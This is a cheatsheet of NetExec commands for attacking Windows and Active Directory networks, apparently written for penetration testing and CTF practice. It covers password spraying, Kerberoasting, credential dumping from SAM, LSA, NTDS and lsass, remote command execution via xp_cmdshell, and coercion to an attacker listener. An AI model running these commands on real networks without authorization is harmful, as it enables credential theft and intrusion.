---
title: "NetExec Cheatsheet"
source_url: https://seriotonctf.github.io/CrackMapExec-and-NetExec-Cheat-Sheet/
fetched_at: 2026-09-20T07:24:55Z
license: unspecified
category: ad
---

A cheatsheet for NetExec, featuring useful commands and modules for different services

## Installation

| 1 2 3  | sudo apt install pipx git pipx ensurepath pipx install git+https://github.com/Pennyw0rth/NetExec  |

| 1 2  | netexec --version 1.3.0 - NeedForSpeed - a5ec90e4  |

## Basic Usage

| 1 | netexec <service> <target> -u <username> -p <password> |

Example for SMB:

| 1 | netexec smb target -u username -p password |

## Authentication

### Null Authentication

| 1 | netexec smb target -u '' -p '' |

### Guest Authentication

| 1 | netexec smb target -u 'guest' -p '' |

### Local Authentication

| 1 | netexec smb target -u username -p password --local-auth |

### Kerberos Authentication

| 1 | netexec smb target -u username -p password -k |

| 1 | netexec ldap target --use-kcache |

### SMB Signing

| 1 | netexec smb target(s) --gen-relay-list relay.txt |

## Enumeration

### Basic Enumeration

### List Shares

| 1 2  | netexec smb target -u '' -p '' --shares netexec smb target -u username -p password --shares  |

### List Usernames

| 1 2 3  | netexec smb target -u '' -p '' --users netexec smb target -u '' -p '' --rid-brute netexec smb target -u username -p password --users  |

### Spraying

| 1 2  | netexec smb target -u users.txt -p password --continue-on-success netexec smb target -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success  |

| 1 | netexec ssh target -u username -p password --continue-on-success |

## Service-Specific

### SMB

#### All-in-One

| 1 | netexec smb target -u username -p password --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol |

| 1 | netexec smb target -u username -p password -k --get-file target_file output_file --share sharename |

#### Spider_plus Module

| 1 2  | netexec smb target -u username -p password -M spider_plus netexec smb target -u username -p password -M spider_plus -o READ_ONLY=false  |

### LDAP

#### User Enumeration

| 1 | netexec ldap target -u '' -p '' --users |

#### All-in-One

| 1 | netexec ldap target -u username -p password --trusted-for-delegation --password-not-required --admin-count --users --groups |

#### Kerberoasting & ASREProast

| 1 2  | netexec ldap target -u username -p password --kerberoasting hash.txt netexec ldap target -u username -p password --asreproast hash.txt  |

#### BloodHound

| 1 | netexec ldap target -u username -p password --bloodhound --dns-server ip --dns-tcp -c all |

#### LDAP signing

Checks whether LDAP signing and binding are required and/or enforced

| 1 | netexec ldap target -u username -p password -M ldap-checker |

#### ADCS Enumeration

| 1 | netexec ldap target -u username -p password -M adcs |

#### MachineAccountQuota

| 1 | netexec ldap target -u username -p password -M maq |

#### Pre-Created Computer Accounts

| 1 | netexec ldap target -u username -p password -M pre2k |

| 1 | netexec ldap target -u username -p password --find-delegation |

### MSSQL

#### Authentication

| 1 | netexec mssql target -u username -p password |

#### Executing Commands via xp_cmdshell

| 1 | netexec mssql target -u username -p password -x command_to_execute |

| 1 | netexec mssql target -u username -p password --get-file output_file target_file |

### FTP

#### List Files & Directories

| 1 2  | netexec ftp target -u username -p password --ls netexec ftp target -u username -p password --ls folder_name  |

#### Retrieve a File

| 1 | netexec ftp target -u username -p password --ls folder_name --get file_name |

## Credential Dumping

### Secrets Dump

| 1 2  | netexec smb target -u username -p password --lsa netexec smb target -u username -p password --sam  |

### NTDS

| 1 2  | netexec smb target -u username -p password --ntds netexec smb target -u username -p password -M ntdsutil  |

### DPAPI

| 1 | netexec smb target -u username -p password --dpapi |

### lsass

| 1 | netexec smb target -u username -p password -M lsassy |

### LAPS

| 1 | netexec smb target -u username -p password --laps |

### gMSA

| 1 2 3  | netexec ldap target -u username -p password --gmsa netexec ldap target -u username -p password --gmsa-convert-id id netexec ldap domain -u username -p password --gmsa-decrypt-lsa gmsa_account  |

### Group Policy Preferences

| 1 | netexec smb target -u username -p password -M gpp_password |

### Retrieve MSOL account password

| 1 | netexec smb target -u username -p password -M msol |

### Chaining Arguments

| 1 | netexec smb target -u username -p password --sam --lsa --dpapi |

## Vulnerabilities

Check if the DC is vulnerable to zerologon, petitpotam, nopac

| 1 2 3  | netexec smb target -u username -p password -M zerologon netexec smb target -u username -p password -M petitpotam netexec smb target -u username -p password -M nopac  |

## Useful Modules

### Webdav

Checks whether the WebClient service is running on the target

| 1 | netexec smb target -u username -p password -M webdav  |

### Veeam

Extracts credentials from local Veeam SQL Database

| 1 | netexec smb target -u username -p password -M veeam |

### slinky

Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions

| 1 | netexec smb target -u username -p password -M slinky  |

### coerce_plus

Check if the Target is vulnerable to any coerce vulns (PetitPotam, DFSCoerce, MSEven, ShadowCoerce and PrinterBug)

| 1 | netexec smb target -u username -p password -M coerce_plus -o LISTENER=tun0_ip |

### enum_av

Gathers information on all endpoint protection solutions installed on the the remote host

| 1 | netexec smb target -u username -p password -M enum_av |

## Resources

## Practice
